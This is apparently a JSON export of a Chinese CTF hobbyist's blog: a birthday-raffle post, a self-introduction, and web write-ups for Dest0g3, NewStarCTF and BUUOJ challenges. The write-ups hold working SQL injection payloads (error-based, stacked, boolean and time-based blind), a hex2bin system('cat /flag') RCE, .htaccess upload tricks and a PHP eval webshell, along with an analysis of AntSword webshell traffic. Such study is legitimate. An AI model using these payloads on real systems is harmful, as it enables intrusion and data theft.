[{"title":"Birthday Gift","date":"2022-11-13T15:29:36.000Z","url":"/2022/11/13/Birthday-Gift/","tags":[["Introduce_Myself","/tags/Introduce-Myself/"]],"categories":[["Intro","/categories/Intro/"]],"content":"Nothing Here 生日要送点啥 梗概：为庆祝3rr0r332的生日，Err0r233特地准备了一点点小礼物给大家（雾）额，其实只是本人生日，什么玩意啊你瞧你写的 本次奖品奖金非常不丰富，其中奖品包含： 1.额，很水的定制钢笔 PS:可以在笔帽/笔身上刻字 2.粥粥人最爱的折扇 3.究极水的一个月大会员 抽三个吧，一人一个，从下到上抽 大概就这样，纯穷逼，啥东西都拿不出手 一些Q&amp;AQ：可以换成其他礼物吗？ A：当然可以，不要选择太贵的就行了捏~ Q：怎么抽呢？ A：使用python random库随机抽取。抽奖流程如下： 在本篇博客下评论，记得填QQ邮箱，方便抓取QQ头像 评论内容：随便写，填填抽奖用的马甲就好了 抽奖马甲包括且不限于： 嘉然今天吃什么、假日威龙陈、缄默德克萨斯、Err0r233什么时候药丸啊、十六岁玉玉女高中生、preg_replace()、1^ascii(substr((database(),1,1))&lt;107)–+、1^1、$fl4g.&#x3D;$wsnd ps：如果使用异或运算(^)的，1^1会当成id-0 pps：上一条异或运算条例无效 但是不能带有空格，比如123 abc，优先截取空格前内容 如果有相同id的，或者相似度极高的： 取时间较早的那个 考虑取消捏 开摆 Q：抽不到能暴打Err0r吗？ A：暴打Err0r关我Err0r2333什么事 Q：什么时候开奖 A：12.8，记不住的dd我 Q：能做点什么增加抽奖权重吗？ A：看到底下那个打赏了吗？ Q：上一条是真的吗？ A：假的 Q：钢笔刻字能刻什么内容呢？ A：看看情况&#x3D; &#x3D; Q：折扇是什么类型的呢？ A：印象折扇&#x2F;浮生听风系列（夕&#x2F;乌有&#x2F;诗怀雅&#x2F;星熊） 优先自选，如果没货就难办了 Q：写写信？ A：额？你想要我写啥给你啊…我这边出不去寄件怎么办呢 Q：我中奖了呢？ A：私信名字地址电话，方便我线下爆破你 谢谢各位捧场，呃呃呃，转发也是可以的，建议复制直链或者生成二维码？ Finished"},{"title":"Dest0g3 520 迎新赛部分write up","date":"2022-11-13T06:42:49.000Z","url":"/2022/11/13/Destog3-520-%E8%BF%8E%E6%96%B0%E8%B5%9B%E9%83%A8%E5%88%86write-up/","tags":[["SQL_Injection","/tags/SQL-Injection/"],["RCE","/tags/RCE/"],["Upload","/tags/Upload/"],["POST","/tags/POST/"]],"categories":[["CTF Web WriteUp","/categories/CTF-Web-WriteUp/"]],"content":"你管这叫迎新赛… 猛新啊，那没事了。 只有自己不会做的世界达成了 Misc的话… 之后再看看 phpdestrequire_once绕过 require_once()：引用或者包含外部的一个php文件，但是如果已经包含过一次了，该文件不会再次被包含 源码如下： 可以看见flag.php已经被包含了一次了，所以我们要进行require_once的绕过 参考这篇文章的payload： php源码分析 require_once 绕过不能重复包含文件的限制 | CN-SEC 中文网 进行base64解码后就能获得flag 成功获得flag EasyPHP提示：Post something 认识set_error_handler() 源码如下： 上面那个if的条件肯定是实现不了的，哪里有大于24小时或者31天或者60秒的时候啊 所以关键就是在set_error_handler()上了 这个函数是，当报错时，就会执行 也就是我们要POST传参让其报错（ 又因为$fl4g 和 $dest0g3之间有个. 代表拼接 （例如fl4g&#x3D;a dest0g3&#x3D;b 之后的结果就是ab） 但是php中，数组和字符串是不能拼接的，会报错 所以我们传入数组 就会报错，执行set_error_hanlder 打印fl4g SimpleRCE学到了新姿势… Try Try hex2bin 源码如下： 我的妈，那叫一个地狱绘图 ban掉了: ^ 、.、&#96;、大于号、小于号、等于号、双引号、正则preg、&amp;、|、%0、{}、$、+、\\ 然后ban掉了常用的eval执行的命令 但是，唯独少了个单引号 参考了dalao的wp，发现一个神奇的函数：hex2bin() hex2bin()：转换十六进制字符为二进制ASCII字符串 用法：hex2bin(‘hexcode’) 例：echo hex2bin(&#39;68656c6c6f20776f726c64&#39;); &#x2F;&#x2F;输出Hello World 所以没有过滤单引号给我们使用了hex2bin的机会 只需要构造出system(‘cat &#x2F;flag’)就结束了 system –&gt; 73797374656d cat &#x2F;flag –&gt; 636174202f666c6167 也就是构造 aaa=hex2bin(&#39;73797374656d&#39;)(hex2bin(&#39;636174202f666c6167&#39;)); 成功获取flag funny_upload.htaccess的新姿势 文件上传的新姿势 打开F12可以看到如下脚本： 对后缀做了要求，我第一次做的时候直接传.htaccess和图片🐎蚁剑是连不上的&#x3D; &#x3D; 看看wp，要用php包含的方式连蚁剑，我也不知道为什么，挺神奇的 我们的.htaccess参数有： .htaccess中使用auto_prepend_file与auto_append_file能在所有页面的顶部和底部require文件 php_value auto_prepend_file 在页面顶部加载文件 php_value auto_append_file 在页面底部加载文件 所以我们传入的.htaccess文件内容如下： 然后传个1.txt 蚁剑连接，找到flag Really Easy SQL延时盲注（过滤sleep()，substr()） 输入啥都没反应，由于又是SQL注入，很容易想到延时盲注 提示是insert注入 所以payload的格式有：0&#39; or payload or&#39; 采用NewStarCTF的延时盲注脚本就可以了 但是这里直接使用会发现啥也没有，那肯定是过滤了字段 找了找writeup： 发现给了黑名单 过滤sleep和substr 所以我们的payload修改下，mid能够替换substr，benchmark能替换sleep benchmark：让数据库反复多次做一件事，增大延迟（比如执行2500000次的MD5加密） 这个benchmark的误差真的太大了，注意使用时按照延迟修改下keep>的参数 尤其是跑table和column的时候，那个误差，会输出全是~ 同样使用二分脚本即可，payload编写方式与NewStarCTF 的延时盲注一致 同样的，睡一觉起来就能拿到flag了 先去睡会吧~ 不通顺的地方我也没办法，benchmark真的就是误差太大了，我这边使用3000000次和1.8能跑出flag EasySQL和上一题是一样的，但是过滤了大小于号… 那么我们就不能够用二分跑了，只能一个个遍历，我靠 用二分能够稍微提速，遍历那就是坐牢中的坐牢了（我手机点完外卖了都没跑完一个） 同样写脚本，只需要注意什么时候中断循环就行了 同样使用3000000次和1.8的keep，跑出来的结果是最精确的 当然也可以试试(32,127)，正向跑，不知道正向跑和反向跑哪个快点呢&#x3D; &#x3D; 这是真的慢啊啊啊啊啊 跑了大概17、8分钟后，终于跑完了 会看wp然后会做的就这点了，剩下的啥都不会做，寄寄寄 参考资料： .htaccess文件解析漏洞 Dest0g3 520迎新赛 web部分 wp PHP字符串函数hex2bin require_once 绕过 还是开摆吧，呜呜 Orz"},{"title":"看看蚁剑流量包","date":"2022-11-10T15:37:24.000Z","url":"/2022/11/10/%E7%9C%8B%E7%9C%8B%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%8C%85/","tags":[["POST","/tags/POST/"],["Misc","/tags/Misc/"]],"categories":[["CTF Misc","/categories/CTF-Misc/"]],"content":"今天来看看Misc（雾） 只是简单的看一下蚁剑上传的包被wireshark抓包以后的形式 ~~绝对不是因为群友Cauliweak9~~ 工具准备Wireshark &#x2F; Burp Suite （抓包工具，如果使用Burp需要在蚁剑设置代理） 中国蚁剑（AntSword） 以及测试靶机（使用校内靶机进行测试） 开始测试 1.使用txt文档写一个简单的一句话木马 &lt;?php @eval($_POST[&quot;a&quot;]);?&gt; 然后修改成1.php 2.随后上传至靶机，使用蚁剑连接。连接成功后打开虚拟终端 3.使用Wireshark监听数据，虚拟终端内输入whoami，将会获得如下图POST包 也可以输入其他命令（比如我输入的是cd &#x2F;var&#x2F;www&#x2F;html&#x2F;） 3.1 如果你使用的是Burp Suite，打开监听，设置蚁剑的代理为127.0.0.1:8080 然后重复3.的步骤 可以将其复制出来，会发现仅有简单的urlencode，使用解码工具就能够得到以下代码： 又长又臭的一段代码 分析源码 开头：朴实无华的post（连接的密码） 存在有以下的特征： 以@ini_set(&quot;display_errors&quot;, &quot;0&quot;); @set_time_limit(0);开头，由于蚁剑是明文传输，所以很容易被发现 后面有base64字符 以及数据包内存在base64加密的分段内容，经过解码后可以看到路径 命令 以及随机数（后面会看见） 使用eval执行 注：旧版蚁剑还有的特征在user-agent处，请求头是antsword xxx，但是在新版的蚁剑中此特征已被移除。UA头已经改为默认ua头了（下图为旧版蚁剑的UA头） 可以看见function占大部分，而且发送指令时，代码和指令是一块发送的（例如发送了其他post的指令） 就像下面的post指令 使用wireshark可以看到传参的值 将传参的值使用base64解码（注意，从第三位开始才能正常解码），解码结果如下 基本上只有简单的加密 Base64加密在编码器中选择base64加密 wireshark抓包后的结果如下 可以看到明显的base64 eval函数 Value: @eval(@base64_decode($_POST[&#39;c540d73cacbdc8&#39;])); 经过base64解密，可以看到如下图所示的结果 可以看得出来，和明文是一样的 chr()加密结果大同小异 同样解码后还是经典的@ini_set(&quot;display_errors&quot;, &quot;0&quot;); RSA加密在蚁剑的编码器管理中生成RSA密钥 传上去的流量包是这样的，毫无规律 大概就是这样了 写的很水，也不会做Orz 参考资料： 菜刀、蚁剑、冰蝎、哥斯拉特征码 蚁剑流量分析 大佬轻喷qwq"},{"title":"Buuoj Hack World 题解","date":"2022-11-09T05:08:46.000Z","url":"/2022/11/09/Buuoj-Hack-World-%E9%A2%98%E8%A7%A3/","tags":[["SQL_Injection","/tags/SQL-Injection/"],["POST","/tags/POST/"]],"categories":[["CTF Web WriteUp","/categories/CTF-Web-WriteUp/"]],"content":"续接上文 打开靶机同样是sql注入，题面已经提示我们flag在flag表的flag列里了 接下来我们只需要查询就好了 检测注入方式输入1’ 回显bool(false) 没有报错信息 使用堆叠注入和联合查询 均回显SQL Injection Checked. 那只能考虑盲注，测试下是否有两种回显方式 使用1^1 和1^0 测试 发现1^1时，回显Error 发现1^0时，回显Hello, glzjin wants a girlfriend. 说明可以使用盲注 直接跑脚本就行了 把昨天的脚本复制一下，post传参名称改为id就好了（题目提示要我们提供id） Payload 但是这里跑是跑不出结果的 问题分析测试语句 1^(ascii(substr((select(group_concat(flag))from(flag)),1,1))&lt;104) (因为flag的第一个字母f的ascii是102) 发现SQL Injection Checked 所以说某些词被检测到了 经测试.. 当输入select(group_concat(flag))时，检测到了SQL注入 修改Payload对于单个词汇，可以去掉group_concat 所以脚本payload改为 1^(ascii(substr((select(flag)from(flag)),%d,1))&lt;%d)%(i,mid) 成功拿到flag PS：不要直接copy我的flag，这个题是动态flag"},{"title":"NewStarCTF SQL注入题","date":"2022-11-08T07:24:09.000Z","url":"/2022/11/08/NewStarCTF-SQL%E6%B3%A8%E5%85%A5%E9%A2%98/","tags":[["SQL_Injection","/tags/SQL-Injection/"],["POST","/tags/POST/"]],"categories":[["CTF Web WriteUp","/categories/CTF-Web-WriteUp/"]],"content":"摆烂大师的第一篇Web文章，qwq。检验我摆烂的水平的时间到了 写写NewStarCTF的SQL注入题吧… 五周考了五个注入，考的点都不一样 NewStarCTF Week 1： Word - For - You嗯… 这个题其实并不算sql注入，只是让你熟悉SQL的语句罢了 打开靶机查询语句发现，输入1和输入1’的回显是一致的，根据这个信息能够初步得出考的应该不是SQL注入 SQL万能密码一般查询数据库执行的语句时 select user_id,user_type,email from users where user_id=&#39;用户名&#39; and password=&#39;密码&#39; 由于后台进行数据库查询时没有滤过单引号，当输入admin 和 1’ or’1’&#x3D;’1时，执行的语句为： select user_id,user_type,email from users where user_id=&#39;admin&#39; and password=&#39;1&#39; or&#39;1&#39;=&#39;1&#39; 这样子看的话，SQL查询语句被分成了两段： 第一段：select user_id,user_type,email from users where user_id=&#39;admin&#39; and password=&#39;1&#39; （由于sql语句中逻辑优先度 【&#x3D;】&gt;【and】&gt;【or】） 第二段：&#39;1&#39;=&#39;1&#39; 这两段语句之间的逻辑运算符是or 由于1&#x3D;1恒为真，所以这段SQL语句恒为真，认证成功 payload使用SQL注入万能密码查询 1&#39; or&#39;1&#39;=&#39;1 拿到flag NewStarCTF Week 2： Word - For - You (2 Gen)报错注入 &#x2F; sqlmap一把梭 打开靶机输入1’ 发现报错，存在SQL注入 测试联合注入测试字段输入1&#39; order by 3# 报错 而输入1&#39; order by 2# 回显正常，说明字段数为2 测试回显位输入1&#39; union select 1,2# 只显示查询成功，说明没有回显位 无法使用联合注入查询 使用报错注入报错注入适用条件：页面没有回显位，但是页面会有报错信息，例如输入 1&#39; order by 3#的时候 注入语句：updatexml(1,&#39;~&#39;,3)，当第二个语句包含特殊字符时，数据库会报错，并且会把参数的内容显示在报错中 需要使用concat语句拼接字符串，长串的语句使用group_concat 查询命令： 1&#39; and updatexml(1,concat(&#39;~&#39;,database()),3)# –爆库 爆出库名wfy 1&#39; and updatexml(1,concat(&#39;~&#39;,(select group_concat(table_name) from inforamtion_schema.tables where table_schema=database())),3)# –爆表 1&#39; and updatexml(1,concat(&#39;~&#39;,(select group_concat(column_name) from information_schema.columns where table_name=&#39;wfy_comments&#39;)),3)# –爆列名 爆出的列名为id,text,user,name,display 我们只需要查询text的内容即可 payload1&#39; and updatexml(1,concat(&#39;~&#39;,(select(reverse(group_concat(text))) from wfy_comments)),3)# 要点： 报错注入的查询内容的字符是有限制的，如果内容过多，则无法回显。所以我们这里使用reverse()将flag倒着输出 使用select之前都需要在select前加括号 拿到倒置的flag sqlmap一把梭sqlmap的使用教程可以查看这篇博客文章 &lt;[(9条消息) 工具使用]SqlMap_拈花倾城的博客-CSDN博客_sqlmap联动msf&#x2F;&gt; 我们可以使用burp抓包的方式，抓到包的数据存入txt文本内，并使用sqlmap梭哈 将抓包的数据保存至txt文本内 sqlmap -r 1.txt --dbs sqlmap -r 1.txt -D wfy --dump 爆库内容 NewStarCTF Week 3： multiSQL堆叠注入，sql预处理语句 题目描述：需要我们修改火华老师的成绩，让他通过四级考试 测试联合注入 &#x2F; 报错注入输入1&#39; 1均无回显 输入1&#39; union select 1,2,3,4# 发现被过滤 联合注入失败 由于无报错信息，无法使用报错注入 堆叠注入堆叠注入是将多个sql语句一起执行，使用;间隔的注入方式 输入1&#39;;show databases;# 爆库 输入1&#39;;show tables;# 爆表 输入1&#39;;show columns from score;# 爆列名 修改数据使用update语句修改分数即可 updatescore set listen=9999 where username=&quot;火华&quot; 发现被过滤，怀疑过滤update 所以这里需要我们使用sql预处理语句进行拼接，绕过update的过滤 1&#39;;set @sql=concat(&#39;u&#39;,&#39;pdate score set listen=99999 where username=&quot;火华&quot;&#39;);prepare sql_exe from @sql;execute sql_exe;# 设置sql语句&#x3D;拼接u 和后面的语句 预处理sql_exe 执行sql_exe 点击验证成绩即可，然后就能拿到flag 或者 1&#39;; handler scoreopen asa; handler a read next;# 查看分数 点击验证成绩就能获得flag 彩蛋这里如果修改的分数不一样的话，拿到flag的对话也是不一样的 修改成100分的结果如下 修改成99999分的结果如下 所以这个故事告诉我们不要把分数改的太大（雾） NewStarCTF Week 4： 又一个SQL异或&#x2F;布尔盲注 打开靶机尝试性输入1 和 1’ 果然，寄。没有回显位，没有报错信息。 我们常用的三种注入方式已经无效了，所以我们接下来要考虑盲注 由于输入1 和 1’的回显信息是好耶和啊哦（刚好是两种不同的信息） 我们这里输入0试试 发现输入0和输入1是两种不同的回显，这样我们就可以使用盲注了 异或运算异或的运算有： 1 ^ 1 &#x3D; 0 1 ^ 0 &#x3D; 1 0 ^ 0 &#x3D; 0 0 ^ 1 &#x3D; 1 也就是说，两件事的异或运算中，如果有一真一假，就会输出1 如果两件都是真，则输出0 那么我们就可以通过异或运算构造sql语句查询 1^(length(database())=3) 注：如果过滤空格，则需要通过加括号的方式进行绕过，此题过滤了空格，所以要在length前加括号 如果数据库的名称长度为3，则为真 1^1 &#x3D; 0，传的数据为0，回显为啊哦 如果数据库的名称长度不为3，则传的数据为1，回显为好耶 通过不断更改&#x3D;后面的数字，可以得出数据库的长度 发现&#x3D;3时，返回啊哦，则说明数据库长度为3，并且布尔&#x2F;异或盲注可用~ 接下来就是编写脚本的事情了 编写盲注脚本采用二分法方式编写盲注脚本 啥是二分法方式？emmm，盲注的原理是一个字符的ascii码数值与你的数值作比较，需要一个个进行比较输出 比如爆库的一个查询语句是1^(ascii(substr(database(),1,1))&#x3D;100) 即数据库名称的第一个字符的ascii 与 100 比较，如果是100 即提交0，返回的值是啊哦 而二分法能够缩短这个过程（ 首先，从数组的中间元素开始搜索，如果该元素正好是目标元素，则搜索过程结束，否则执行下一步。 如果目标元素大于&#x2F;小于中间元素，则在数组大于&#x2F;小于中间元素的那一半区域查找，然后重复步骤（1）的操作。 如果某一步数组为空，则表示找不到目标元素。 大致意思是取第一个字符的ascii值和ascii（32，128）中间值，也就是80（刚好是常用的字段）作比较，如果ascii值大于中间值，从（80,132）的中间值比较,重复比较 直至ascii值相等。 结束一个判断的依据根据页面返回的信息不同，在我的情况中，如果返回的是啊哦，说明是1^1型，那么，啊哦就是正确的依据 Python编写这里给出post &#x2F; get请求的两种盲注的脚本（ 其实你只要跑一次就知道为什么要-1了 最后一次输出的值是&lt;120，返回为真，但是我们此时的mid是120，真正的值是&lt;120 get传参也是如此 这里给出buuoj.cn FinalSQL的盲注脚本 我们愉快的跑脚本就完事了 NewStarCTF Week 5： Final Round延时盲注 题面提示：啊呜，好困呜呜（sleep） 进入靶机其实已经不用测什么方式注入了，sleep嘛，延时注入 测试语句： 114514||if(length(database())=3,sleep(0.2),1) 如果数据库名长度为3，休眠两秒再访问（ 肉眼可见的延迟 编写脚本同样使用python脚本，同样也是post请求，同样也是二分法 套异或的就行了，只不过判断的方式有些不同 bool&#x2F;异或 是根据1和0的两种回应来判断的，而time是根据访问的时间来进行访问的 然后就等吧… 啊呜，好困呜呜 睡一觉就把表跑完了，放心吧 记得renew 靶机 睡了一觉，终于跑完了（我忘记开最后那个倒序重整了，所以flag是倒着的） flag{Ju2t_let_me_sleep_f0r_a_while} 结束辣，好题，但是结束了才会做呜呜呜 看我摆烂的结果如何？ 题目来自：buuoj.cn &#x2F;&#x2F;NewStarsCTF 图片来自：截图 侵删qwq"},{"title":"About Me","date":"2022-11-07T14:27:49.000Z","url":"/2022/11/07/Test/","tags":[["Introduce_Myself","/tags/Introduce-Myself/"]],"categories":[["Intro","/categories/Intro/"]],"content":"Err0r233的自我介绍qwq 一个普通的摆烂哥，普通到不能再普通 qwq，梦想是做到一份非常简单的高考数学卷 不开玩笑了，真正的梦想是变得有钱qwq 练习时长两分钟的个人练习生，甚至不能说是练过ctf的呜呜 啥也不会，留着摆烂 哈？没有摆烂的人生哪能叫做好人生啊 博客的内容 偶尔写写题解qwq(x) 摆烂的时候写写东西用的 Thai神的任务罢了 以上三点都是错的 所以我要到什么时候才能有钱啊啊啊啊啊啊啊 Friends提供一下链接和头像就好了（雾） 图片来自：网络&#x2F;鹰角网络叙拉古人cg 侵删qwq"}]